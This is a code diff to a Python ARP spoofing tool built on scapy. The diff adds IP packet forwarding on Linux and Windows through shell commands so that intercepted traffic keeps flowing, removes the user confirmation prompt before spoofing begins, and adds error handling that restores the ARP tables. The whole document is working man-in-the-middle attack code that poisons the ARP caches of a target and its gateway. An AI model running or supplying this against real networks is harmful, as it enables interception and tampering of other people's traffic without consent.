@@ -4,6 +4,7 @@ import scapy.all as scapy
 import argparse
 import time
 import sys
+import os
 
 def argumentParse():
     """
@@ -22,6 +23,19 @@ def argumentParse():
     return options
 
 
+def enable_packet_forwarding():
+    """
+    Enable IP packet forwarding.
+    """
+    if os.name == "posix":
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    elif os.name == "nt":
+        os.system("netsh interface ipv4 set global forwarding=enabled")
+    else:
+        print("[-] Unable to enable packet forwarding on this OS")
+        sys.exit()
+
+
 def scan_network(ip_range):
     """
     Scan the network for devices given an IP address or range.
@@ -31,7 +45,11 @@ def scan_network(ip_range):
     arp_request_packet = ether_header/arp_header
     answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]
 
-    return answered_list[0][1].hwsrc
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        print(f"[-] Unable to find MAC address for {ip_range}")
+        sys.exit()
 
 
 def spoof(target_ip, router_gateway):
@@ -72,29 +90,31 @@ Created by : Wathsala Dewmina
     options = argumentParse()
     packet_count = 0
 
+    enable_packet_forwarding()
+
     try:
-        confirmation = input("spoofer@arp ~: Do you want to continue this spoofing ? (y/n) : ").lower()
-        if confirmation == 'y':
-            print("spoofer@arp ~: Arguments entered..\n")
-            print(f"[+] Target IP   {options.target_ip}")
-            print(f"[+] Gateway IP  {options.gateway}\n")
+        print("spoofer@arp ~: Arguments entered..\n")
+        print(f"[+] Target IP   {options.target_ip}")
+        print(f"[+] Gateway IP  {options.gateway}\n")
 
-            while True:
-                spoof(options.target_ip, options.gateway)
-                spoof(options.gateway, options.target_ip)
-                packet_count += 2
-                print(f"\r[+] Packets sent to {options.target_ip} and {options.gateway} | P COUNT : {packet_count}")
+        while True:
+            spoof(options.target_ip, options.gateway)
+            spoof(options.gateway, options.target_ip)
+            packet_count += 2
+            print(f"\r[+] Packets sent to {options.target_ip} and {options.gateway} | P COUNT : {packet_count}", end="")
 
-                time.sleep(1.5)
-        else:
-            print("[+] Exiting...")
-            sys.exit()
+            time.sleep(1)
 
     except KeyboardInterrupt:
         restoreARP(options.target_ip, options.gateway)
         restoreARP(options.gateway, options.target_ip)
         print("\n[+] Stopping ARP spoofing please wait...")
         print("[+] ARP Spoof successfully Restored...")
+
+    except Exception as e:
+        print(f"\n[-] An error occurred: {e}")
+        restoreARP(options.target_ip, options.gateway)
+        restoreARP(options.gateway, options.target_ip)
 
 
 if __name__ == "__main__":
